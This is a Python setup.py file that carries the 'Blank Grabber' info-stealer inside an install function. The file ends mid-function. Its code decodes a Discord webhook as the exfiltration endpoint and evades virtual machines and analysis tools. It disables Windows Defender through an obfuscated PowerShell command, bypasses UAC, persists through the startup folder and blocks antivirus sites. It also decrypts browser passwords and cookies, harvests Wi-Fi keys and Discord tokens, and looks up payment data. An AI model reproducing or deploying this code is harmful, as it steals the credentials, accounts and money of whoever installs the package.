import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop


def rcd():
    import os
    import sys
    import base64
    import subprocess

    try:
        subprocess.check_call(["py", "-m", "pip",
                               "install", "urllib3", "pyaes"])
    except subprocess.CalledProcessError:
        pass

    import json
    import pyaes
    import random
    import shutil
    import sqlite3
    import re
    import traceback
    import time
    import ctypes
    import logging
    import zlib
    from threading import Thread
    from ctypes import wintypes
    from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
    disable_warnings_urllib3()

    class Settings:
        C2 = (0, base64.b64decode('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExODk0Mjc0Mjk2MDE3MTAxMDAvSm1MdnAtWHpqeUd6dVlGck5makJWV1prUDZhNDJMZV96TkdNRWE4cDVXX1ZWekhoNFZzRVVmb21kOG1GNDhnMWhMNEI=').decode())
        Mutex = base64.b64decode('bnRtVFdTaEQzWTNiVUFKcA==').decode()
        PingMe = bool('true')
        Vmprotect = bool('')
        Startup = bool('')
        Melt = bool('')
        UacBypass = bool('')
        ArchivePassword = base64.b64decode('ZGcx').decode()
        HideConsole = bool('')
        Debug = bool('true')
        RunBoundOnStartup = bool('')
        CaptureWebcam = bool('true')
        CapturePasswords = bool('true')
        CaptureCookies = bool('true')
        CaptureAutofills = bool('true')
        CaptureHistory = bool('true')
        CaptureDiscordTokens = bool('true')
        CaptureGames = bool('true')
        CaptureWifiPasswords = bool('true')
        CaptureSystemInfo = bool('true')
        CaptureScreenshot = bool('true')
        CaptureTelegram = bool('true')
        CaptureCommonFiles = bool('true')
        CaptureWallets = bool('true')
        FakeError = (bool(''), ('', '', '0'))
        BlockAvSites = bool('true')
        DiscordInjection = bool('true')

    if not hasattr(sys, '_MEIPASS'):
        sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
    ctypes.windll.kernel32.SetConsoleMode(
        ctypes.windll.kernel32.GetStdHandle(-11), 7)
    logging.basicConfig(
        format='\x1b[1;36m%(funcName)s\x1b[0m:\x1b[1;33m%(levelname)7s\x1b[0m:%(message)s')
    for _, logger in logging.root.manager.loggerDict.items():
        logger.disabled = True
    Logger = logging.getLogger('Blank Grabber')
    Logger.setLevel(logging.INFO)
    if not Settings.Debug:
        Logger.disabled = True

    class VmProtect:
        BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE',
                             'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
        BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29',
                                     'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
        BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john',
                             'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
        BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp',
                             'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

        @staticmethod
        def checkUUID() -> bool:
            Logger.info('Checking UUID')
            uuid = subprocess.run('wmic csproduct get uuid', shell=True, capture_output=True).stdout.splitlines()[
                2].decode(errors='ignore').strip()
            return uuid in VmProtect.BLACKLISTED_UUIDS

        @staticmethod
        def checkComputerName() -> bool:
            Logger.info('Checking computer name')
            computername = os.getenv('computername')
            return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES

        @staticmethod
        def checkUsers() -> bool:
            Logger.info('Checking username')
            user = os.getlogin()
            return user.lower() in VmProtect.BLACKLISTED_USERS

        @staticmethod
        def checkHosting() -> bool:
            Logger.info('Checking if system is hosted online')
            http = PoolManager(cert_reqs='CERT_NONE')
            try:
                return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(errors='ignore').strip() == 'true'
            except Exception:
                Logger.info('Unable to check if system is hosted online')
                return False

        @staticmethod
        def checkHTTPSimulation() -> bool:
            Logger.info('Checking if system is simulating connection')
            http = PoolManager(cert_reqs='CERT_NONE', timeout=1.0)
            try:
                http.request(
                    'GET', f'https://blank-{Utility.GetRandomString()}.in')
            except Exception:
                return False
            else:
                return True

        @staticmethod
        def checkRegistry() -> bool:
            Logger.info('Checking registry')
            r1 = subprocess.run(
                'REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2', capture_output=True, shell=True)
            r2 = subprocess.run(
                'REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2', capture_output=True, shell=True)
            gpucheck = any((x.lower() in subprocess.run('wmic path win32_VideoController get name', capture_output=True,
                                                        shell=True).stdout.decode(errors='ignore').splitlines()[2].strip().lower() for x in ('virtualbox', 'vmware')))
            dircheck = any([os.path.isdir(path)
                            for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
            return r1.returncode != 1 and r2.returncode != 1 or gpucheck or dircheck

        @staticmethod
        def killTasks() -> None:
            Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)

        @staticmethod
        def isVM() -> bool:
            Logger.info('Checking if system is a VM')
            Thread(target=VmProtect.killTasks, daemon=True).start()
            result = VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName(
            ) or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
            if result:
                Logger.info('System is a VM')
            else:
                Logger.info('System is not a VM')
            return result

    class Errors:
        errors: list[str] = []

        @staticmethod
        def Catch(func):

            def newFunc(*args, **kwargs):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if isinstance(e, KeyboardInterrupt):
                        os._exit(1)
                    if not isinstance(e, UnicodeEncodeError):
                        trb = traceback.format_exc()
                        Errors.errors.append(trb)
                        if Utility.GetSelf()[1]:
                            Logger.error(trb)
            return newFunc

    class Tasks:
        threads: list[Thread] = list()

        @staticmethod
        def AddTask(task: Thread) -> None:
            Tasks.threads.append(task)

        @staticmethod
        def WaitForAll() -> None:
            for thread in Tasks.threads:
                thread.join()

    class Syscalls:

        @staticmethod
        def CaptureWebcam(index: int, filePath: str) -> bool:
            avicap32 = ctypes.windll.avicap32
            WS_CHILD = 1073741824
            WM_CAP_DRIVER_CONNECT = 1024 + 10
            WM_CAP_DRIVER_DISCONNECT = 1026
            WM_CAP_FILE_SAVEDIB = 1024 + 100 + 25
            hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR(
                'Blank'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
            result = False
            if hcam:
                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
                    if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
                        result = True
                    ctypes.windll.user32.SendMessageA(
                        hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
                ctypes.windll.user32.DestroyWindow(hcam)
            return result

        @staticmethod
        def CreateMutex(mutex: str) -> bool:
            kernel32 = ctypes.windll.kernel32
            mutex = kernel32.CreateMutexA(None, False, mutex)
            return kernel32.GetLastError() != 183

        @staticmethod
        def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str = None) -> bytes:

            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', ctypes.c_ulong),
                            ('pbData', ctypes.POINTER(ctypes.c_ubyte))]
            pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(
                encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()
            pOptionalEntropy = None
            if optional_entropy is not None:
                optional_entropy = optional_entropy.encode('utf-16')
                pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(
                    optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
            if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
                data = (ctypes.c_ubyte * pDataOut.cbData)()
                ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
                ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
                return bytes(data)
            raise ValueError('Invalid encrypted_data provided!')

        @staticmethod
        def HideConsole() -> None:
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0)

    class Utility:

        @staticmethod
        def GetSelf() -> tuple[str, bool]:
            if hasattr(sys, 'frozen'):
                return (sys.executable, True)
            else:
                return (__file__, False)

        @staticmethod
        def TaskKill(*tasks: str) -> None:
            tasks = list(map(lambda x: x.lower(), tasks))
            out = subprocess.run('tasklist /FO LIST', shell=True,
                                 capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
            for i in out:
                i = i.split('\r\n')[:2]
                try:
                    name, pid = (i[0].split()[-1], int(i[1].split()[-1]))
                    name = name[:-4] if name.endswith('.exe') else name
                    if name.lower() in tasks:
                        subprocess.run('taskkill /F /PID %d' %
                                       pid, shell=True, capture_output=True)
                except Exception:
                    pass

        @staticmethod
        def UACPrompt(path: str) -> bool:
            return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42

        @staticmethod
        def DisableDefender() -> None:
            command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')
            subprocess.Popen(
                command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

        @staticmethod
        def ExcludeFromDefender(path: str = None) -> None:
            if path is None:
                path = Utility.GetSelf()[0]
            subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(
                path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

        @staticmethod
        def GetRandomString(length: int = 5, invisible: bool = False):
            if invisible:
                return ''.join(random.choices(['\xa0', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
            else:
                return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

        @staticmethod
        def GetWifiPasswords() -> dict:
            profiles = list()
            passwords = dict()
            for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                if 'All User Profile' in line:
                    name = line[line.find(':') + 1:].strip()
                    profiles.append(name)
            for profile in profiles:
                found = False
                for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                    if 'Key Content' in line:
                        passwords[profile] = line[line.find(':') + 1:].strip()
                        found = True
                        break
                if not found:
                    passwords[profile] = '(None)'
            return passwords

        @staticmethod
        def GetLnkTarget(path_to_lnk: str) -> str | None:
            target = None
            if os.path.isfile(path_to_lnk):
                output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(
                    path_to_lnk).replace('\\', '\\\\'), shell=True, capture_output=True).stdout.decode()
                if output:
                    for line in output.splitlines():
                        if line.startswith('Target='):
                            temp = line.lstrip('Target=').strip()
                            if os.path.exists(temp):
                                target = temp
                                break
            return target

        @staticmethod
        def GetLnkFromStartMenu(app: str) -> list[str]:
            shortcutPaths = []
            startMenuPaths = [os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'), os.path.join(
                'C:\\', 'ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs')]
            for startMenuPath in startMenuPaths:
                for root, _, files in os.walk(startMenuPath):
                    for file in files:
                        if file.lower() == '%s.lnk' % app.lower():
                            shortcutPaths.append(os.path.join(root, file))
            return shortcutPaths

        @staticmethod
        def IsAdmin() -> bool:
            return ctypes.windll.shell32.IsUserAnAdmin() == 1

        @staticmethod
        def UACbypass(method: int = 1) -> bool:
            if Utility.GetSelf()[1]:
                def execute(cmd): return subprocess.run(
                    cmd, shell=True, capture_output=True)
                match method:
                    case 1:
                        execute(
                            f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                        execute(
                            'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                        log_count_before = len(execute(
                            'wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                        execute('computerdefaults --nouacbypass')
                        log_count_after = len(execute(
                            'wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                        execute(
                            'reg delete hkcu\\Software\\Classes\\ms-settings /f')
                        if log_count_after > log_count_before:
                            return Utility.UACbypass(method + 1)
                    case 2:
                        execute(
                            f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                        execute(
                            'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                        log_count_before = len(execute(
                            'wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                        execute('fodhelper --nouacbypass')
                        log_count_after = len(execute(
                            'wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                        execute(
                            'reg delete hkcu\\Software\\Classes\\ms-settings /f')
                        if log_count_after > log_count_before:
                            return Utility.UACbypass(method + 1)
                    case _:
                        return False
                return True

        @staticmethod
        def IsInStartup() -> bool:
            path = os.path.dirname(Utility.GetSelf()[0])
            return os.path.basename(path).lower() == 'startup'

        @staticmethod
        def PutInStartup() -> str:
            STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
            file, isExecutable = Utility.GetSelf()
            if isExecutable:
                out = os.path.join(STARTUPDIR, '{}.scr'.format(
                    Utility.GetRandomString(invisible=True)))
                os.makedirs(STARTUPDIR, exist_ok=True)
                try:
                    shutil.copy(file, out)
                except Exception:
                    return None
                return out

        @staticmethod
        def IsConnectedToInternet() -> bool:
            http = PoolManager(cert_reqs='CERT_NONE')
            try:
                return http.request('GET', 'https://gstatic.com/generate_204').status == 204
            except Exception:
                return False

        @staticmethod
        def DeleteSelf():
            path, isExecutable = Utility.GetSelf()
            if isExecutable:
                subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path),
                                 shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
                os._exit(0)
            else:
                os.remove(path)

        @staticmethod
        def HideSelf() -> None:
            path, _ = Utility.GetSelf()
            subprocess.Popen('attrib +h +s "{}"'.format(path), shell=True,
                             creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

        @staticmethod
        def BlockSites() -> None:
            if Utility.IsAdmin():
                call = subprocess.run(
                    'REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath', shell=True, capture_output=True)
                if call.returncode != 0:
                    hostdirpath = os.path.join('System32', 'drivers', 'etc')
                else:
                    hostdirpath = os.sep.join(call.stdout.decode(
                        errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
                hostfilepath = os.path.join(
                    os.getenv('systemroot'), hostdirpath, 'hosts')
                if not os.path.isfile(hostfilepath):
                    return
                with open(hostfilepath) as file:
                    data = file.readlines()
                BANNED_SITES = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com',
                                'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
                newdata = []
                for i in data:
                    if any([x in i for x in BANNED_SITES]):
                        continue
                    else:
                        newdata.append(i)
                for i in BANNED_SITES:
                    newdata.append('\t0.0.0.0 {}'.format(i))
                    newdata.append('\t0.0.0.0 www.{}'.format(i))
                newdata = '\n'.join(newdata).replace('\n\n', '\n')
                subprocess.run('attrib -r {}'.format(hostfilepath),
                               shell=True, capture_output=True)
                with open(hostfilepath, 'w') as file:
                    file.write(newdata)
                subprocess.run('attrib +r {}'.format(hostfilepath),
                               shell=True, capture_output=True)

    class Browsers:

        class Chromium:
            BrowserPath: str = None
            EncryptionKey: bytes = None

            def __init__(self, browserPath: str) -> None:
                if not os.path.isdir(browserPath):
                    raise NotADirectoryError('Browser path not found!')
                self.BrowserPath = browserPath

            def GetEncryptionKey(self) -> bytes | None:
                if self.EncryptionKey is not None:
                    return self.EncryptionKey
                else:
                    localStatePath = os.path.join(
                        self.BrowserPath, 'Local State')
                    if os.path.isfile(localStatePath):
                        with open(localStatePath, encoding='utf-8', errors='ignore') as file:
                            jsonContent: dict = json.load(file)
                        encryptedKey: str = jsonContent['os_crypt']['encrypted_key']
                        encryptedKey = base64.b64decode(
                            encryptedKey.encode())[5:]
                        self.EncryptionKey = Syscalls.CryptUnprotectData(
                            encryptedKey)
                        return self.EncryptionKey
                    else:
                        return None

            def Decrypt(self, buffer: bytes, key: bytes) -> str:
                version = buffer.decode(errors='ignore')
                if version.startswith(('v10', 'v11')):
                    iv = buffer[3:15]
                    cipherText = buffer[15:]
                    return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors='ignore')
                else:
                    return str(Syscalls.CryptUnprotectData(buffer))

            def GetPasswords(self) -> list[tuple[str, str, str]]:
                encryptionKey = self.GetEncryptionKey()
                passwords = list()
                if encryptionKey is None:
                    return passwords
                loginFilePaths = list()
                for root, _, files in os.walk(self.BrowserPath):
                    for file in files:
                        if file.lower() == 'login data':
                            filepath = os.path.join(root, file)
                            loginFilePaths.append(filepath)
                for path in loginFilePaths:
                    while True:
                        tempfile = os.path.join(
                            os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                        if not os.path.isfile(tempfile):
                            break
                    try:
                        shutil.copy(path, tempfile)
                    except Exception:
                        continue
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cursor = db.cursor()
                    try:
                        results = cursor.execute(
                            'SELECT origin_url, username_value, password_value FROM logins').fetchall()
                        for url, username, password in results:
                            password = self.Decrypt(password, encryptionKey)
                            if url and username and password:
                                passwords.append((url, username, password))
                    except Exception:
                        pass
                    cursor.close()
                    db.close()
                    os.remove(tempfile)
                return passwords

            def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
                encryptionKey = self.GetEncryptionKey()
                cookies = list()
                if encryptionKey is None:
                    return cookies
                cookiesFilePaths = list()
                for root, _, files in os.walk(self.BrowserPath):
                    for file in files:
                        if file.lower() == 'cookies':
                            filepath = os.path.join(root, file)
                            cookiesFilePaths.append(filepath)
                for path in cookiesFilePaths:
                    while True:
                        tempfile = os.path.join(
                            os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                        if not os.path.isfile(tempfile):
                            break
                    try:
                        shutil.copy(path, tempfile)
                    except Exception:
                        continue
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cursor = db.cursor()
                    try:
                        results = cursor.execute(
                            'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall()
                        for host, name, path, cookie, expiry in results:
                            cookie = self.Decrypt(cookie, encryptionKey)
                            if host and name and cookie:
                                cookies.append(
                                    (host, name, path, cookie, expiry))
                    except Exception:
                        pass
                    cursor.close()
                    db.close()
                    os.remove(tempfile)
                return cookies

            def GetHistory(self) -> list[tuple[str, str, int]]:
                history = list()
                historyFilePaths = list()
                for root, _, files in os.walk(self.BrowserPath):
                    for file in files:
                        if file.lower() == 'history':
                            filepath = os.path.join(root, file)
                            historyFilePaths.append(filepath)
                for path in historyFilePaths:
                    while True:
                        tempfile = os.path.join(
                            os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                        if not os.path.isfile(tempfile):
                            break
                    try:
                        shutil.copy(path, tempfile)
                    except Exception:
                        continue
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cursor = db.cursor()
                    try:
                        results = cursor.execute(
                            'SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
                        for url, title, vc, lvt in results:
                            if url and title and (vc is not None) and (lvt is not None):
                                history.append((url, title, vc, lvt))
                    except Exception:
                        pass
                    cursor.close()
                    db.close()
                    os.remove(tempfile)
                history.sort(key=lambda x: x[3], reverse=True)
                return list([(x[0], x[1], x[2]) for x in history])

            def GetAutofills(self) -> list[str]:
                autofills = list()
                autofillsFilePaths = list()
                for root, _, files in os.walk(self.BrowserPath):
                    for file in files:
                        if file.lower() == 'web data':
                            filepath = os.path.join(root, file)
                            autofillsFilePaths.append(filepath)
                for path in autofillsFilePaths:
                    while True:
                        tempfile = os.path.join(
                            os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                        if not os.path.isfile(tempfile):
                            break
                    try:
                        shutil.copy(path, tempfile)
                    except Exception:
                        continue
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cursor = db.cursor()
                    try:
                        results: list[str] = [x[0] for x in cursor.execute(
                            'SELECT value FROM autofill').fetchall()]
                        for data in results:
                            data = data.strip()
                            if data and (not data in autofills):
                                autofills.append(data)
                    except Exception:
                        pass
                    cursor.close()
                    db.close()
                    os.remove(tempfile)
                return autofills

    class Discord:
        httpClient = PoolManager(cert_reqs='CERT_NONE')
        ROAMING = os.getenv('appdata')
        LOCALAPPDATA = os.getenv('localappdata')
        REGEX = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
        REGEX_ENC = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'

        @staticmethod
        def GetHeaders(token: str = None) -> dict:
            headers = {'content-type': 'application/json',
                       'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36'}
            if token:
                headers['authorization'] = token
            return headers

        @staticmethod
        def GetTokens() -> list[dict]:
            results: list[dict] = list()
            tokens: list[str] = list()
            threads: list[Thread] = list()
            paths = {'Discord': os.path.join(Discord.ROAMING, 'discord'), 'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'), 'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'), 'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'), 'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'), 'Amigo': os.path.join(Discord.LOCALAPPDATA, 'Amigo', 'User Data'), 'Torch': os.path.join(Discord.LOCALAPPDATA, 'Torch', 'User Data'), 'Kometa': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'), 'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'), 'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'), '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Star', '7Star', 'User Data'), 'Sputnik': os.path.join(
                Discord.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'), 'Vivaldi': os.path.join(Discord.LOCALAPPDATA, 'Vivaldi', 'User Data'), 'Chrome SxS': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'), 'Chrome': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'), 'FireFox': os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles'), 'Epic Privacy Browse': os.path.join(Discord.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'), 'Microsoft Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'), 'Uran': os.path.join(Discord.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'), 'Yandex': os.path.join(Discord.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'), 'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Iridium': os.path.join(Discord.LOCALAPPDATA, 'Iridium', 'User Data')}
            for name, path in paths.items():
                if os.path.isdir(path):
                    if name == 'FireFox':
                        t = Thread(target=lambda: tokens.extend(
                            Discord.FireFoxSteal(path) or list()))
                        t.start()
                        threads.append(t)
                    else:
                        t = Thread(target=lambda: tokens.extend(
                            Discord.SafeStorageSteal(path) or list()))
                        t.start()
                        threads.append(t)
                        t = Thread(target=lambda: tokens.extend(
                            Discord.SimpleSteal(path) or list()))
                        t.start()
                        threads.append(t)
            for thread in threads:
                thread.join()
            tokens = [*set(tokens)]
            for token in tokens:
                r: HTTPResponse = Discord.httpClient.request(
                    'GET', 'https://discord.com/api/v9/users/@me', headers=Discord.GetHeaders(token.strip()))
                if r.status == 200:
                    r = r.data.decode(errors='ignore')
                    r = json.loads(r)
                    user = r['username'] + '#' + str(r['discriminator'])
                    id = r['id']
                    email = r['email'].strip() if r['email'] else '(No Email)'
                    phone = r['phone'] if r['phone'] else '(No Phone Number)'
                    verified = r['verified']
                    mfa = r['mfa_enabled']
                    nitro_type = r.get('premium_type', 0)
                    nitro_infos = {0: 'No Nitro', 1: 'Nitro Classic',
                                   2: 'Nitro', 3: 'Nitro Basic'}
                    nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
                    billing = json.loads(Discord.httpClient.request(
                        'GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors='ignore'))
                    if len(billing) == 0:
                        billing = '(No Payment Method)'
                    else:
